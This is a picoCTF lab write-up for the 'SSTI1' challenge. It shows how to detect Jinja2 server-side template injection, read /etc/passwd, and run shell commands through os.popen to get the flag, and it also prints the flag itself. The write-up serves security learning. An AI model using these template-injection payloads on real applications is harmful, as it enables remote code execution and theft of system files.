# SSTI1

## Description
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:59563/)!
## Solve
1. First we connect to the challenge with the given link.

2. Let's inspect the source code to see if we can find something interesting.
```HTML
<!doctype html> <title>SSTI1</title>  
<h1> Home </h1>  
<p> I built a cool website that lets you announce whatever you want!* </p>  
<form action="/" method="POST"> What do you want to announce: <input name="content" id="announce"> <button type="submit"> Ok </button> </form> <p style="font-size:10px;position:fixed;bottom:10px;left:10px;"> *Announcements may only reach yourself </p>
```

3. If we type something that we want to announce, we can see that the site just displays what we enter, but bigger.
```HTML
<!doctype html>
<h1 style="font-size:100px;" align="center">something</h1>
```

4. If we search for what SSTI stands for, we will see that it means Server Side Template Injection, which according to PortSwigger "is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side".

5. With this in mind, let's try to identify what kind of SSTI we are dealing with, let's try do identify it with the payloads from https://github.com/swisskyrepo/PayloadsAllTheThings

6. It seems like it is using Python + Jinja2. If we try this commands we get the correct results:
```python
{{4*4}}[[5*5]] #16[[5*5]]
{{7*'7'}} would result in 7777777 # 7777777 would result in 7777777
{{config.items()}} ## dict_items([('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)])
```

7. So, let's keep searching for a payload that allow us to achieve remote code execution, let's try this one to read files:
```python
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

```response
# root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```
We succeeded.

8. If we execute the next payload, we can exploit the SSTI calling os.popen().read():
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
#uid=0(root) gid=0(root) groups=0(root)
```

9. And now, we can simply modify it to execute the command we want:
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
#__pycache__
#app.py
#flag
#requirements.txt

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
# picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}
```

10. And that's how we got the flag:
```flag
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}
```

## Additional Notes 

## References

https://portswigger.net/web-security/server-side-template-injection
https://github.com/swisskyrepo/PayloadsAllTheThings